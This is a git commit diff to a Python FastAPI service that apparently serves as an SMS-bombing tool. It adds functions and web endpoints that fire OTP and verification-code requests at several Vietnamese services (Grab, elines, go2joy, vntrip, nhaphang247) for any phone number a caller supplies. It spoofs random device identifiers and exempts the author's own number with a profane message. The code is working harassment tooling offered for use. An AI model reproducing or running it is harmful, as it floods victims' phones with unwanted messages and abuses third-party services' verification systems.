977c2ac8e75ea18fee6d9b69402c0f26cfe4da69
QuanCaiDu2k7 <88080637+QuanCaiDu2k7@users.noreply.github.com>
2022-06-01 11:19:20 -0700

    Update main.py

--- main.py
+++ main.py
@@ -11,6 +11,18 @@ def random_id(length):
         id += random.choice(alpha)
     return id
 
+def generateImei() :
+        return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
+
+def generateRandomString(length = 20) :
+    characters = '0123456789abcdef'
+    charactersLength = len(characters)
+    randomString = ''
+    i = 0
+    while ( i < length ) :
+        randomString += characters[random.randint(0, charactersLength - 1)]
+        i+=1
+    return randomString
 app = FastAPI()
 
 headers = {
@@ -43,7 +55,7 @@ def grab_food(phone):
                 'method': 'SMS',
                 'num_digits': 6,
                 'scope': 'openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile',
-                'phone_number': phone,
+                'phone_number': '84'+phone[1:11],
             }
             response_grab_food = requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp', headers=headers, json=json_data).text
             return response_grab_food
@@ -87,6 +99,81 @@ def meta_vn(phone):
             return response_meta_vn
         except:
             return "Lỗi Không Xác Định!"    
+
+def elines(phone):
+    if phone == "0395524153" or phone == "84395524153":
+        return "Spam Số Tao Làm Lồn À!"
+    else:
+        try:
+            json_data = {
+                'phone': phone,
+                'type': 'sign_up',
+            }
+
+            response_elines = requests.post('https://www.elines.vn/api2/core/sendOTP', headers=headers, json=json_data).text
+            return response_elines
+        except:
+            return "Lỗi Không Xác Định!"  
+        
+def gojoy(phone):
+    if phone == "0395524153" or phone == "84395524153":
+        return "Spam Số Tao Làm Lồn À!"
+    else:
+        try:
+            headers_ = {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+                'Connection': 'keep-alive',
+                'Content-Type': 'application/json; charset=UTF-8',
+                'Device-Encode': generateImei(),
+                'Localization': 'vi',
+                'Origin': 'https://go2joy.vn',
+                'Referer': 'https://go2joy.vn/',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-site',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
+            }
+
+            json_data = {
+                'mobile': phone,
+                'countryCode': '84',
+            }
+
+            response_gojoy = requests.post('https://webbooking-api.go2joy.vn/api/v4/web-booking/user/sendVerifyCode', headers=headers_, json=json_data).text
+            return response_gojoy
+        except:
+            return "Lỗi Không Xác Định!" 
+        
+def vntrip(phone):
+    if phone == "0395524153" or phone == "84395524153":
+        return "Spam Số Tao Làm Lồn À!"
+    else:
+        try:
+            json_data = {
+                'feature': 'register',
+                'phone': '+84'+phone[1:11],
+            }
+
+            response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=headers, json=json_data).text
+            return response_vntrip
+        except:
+            return "Lỗi Không Xác Định!" 
+
+def nhaphang247(phone):
+    if phone == "0395524153" or phone == "84395524153":
+        return "Spam Số Tao Làm Lồn À!"
+    else:
+        try:
+            params = {
+                'phone': phone,
+            }
+
+            response_nhaphang247 = requests.get('https://www.nhaphang247.com/site/get-code', params=params, headers=headers).text
+            return response_nhaphang247
+        except:
+            return "Lỗi Không Xác Định!" 
+        
 @app.post("/tiki")
 def read_item(phone: Optional[str] = None):
     done = tiki(phone)
@@ -106,3 +193,25 @@ def read_item(phone: Optional[str] = None):
 def read_item(phone: Optional[str] = None):
     done = meta_vn(phone)
     return done
+
+@app.post("/elines")
+def read_item(phone: Optional[str] = None):
+    done = elines(phone)
+    return done
+
+@app.post("/gojoy")
+def read_item(phone: Optional[str] = None):
+    done = gojoy(phone)
+    return done
+
+@app.post("/vntrip")
+def read_item(phone: Optional[str] = None):
+    done = vntrip(phone)
+    return done
+
+@app.post("/nhap-hang-247")
+def read_item(phone: Optional[str] = None):
+    done = nhaphang247(phone)
+    return done
+
+
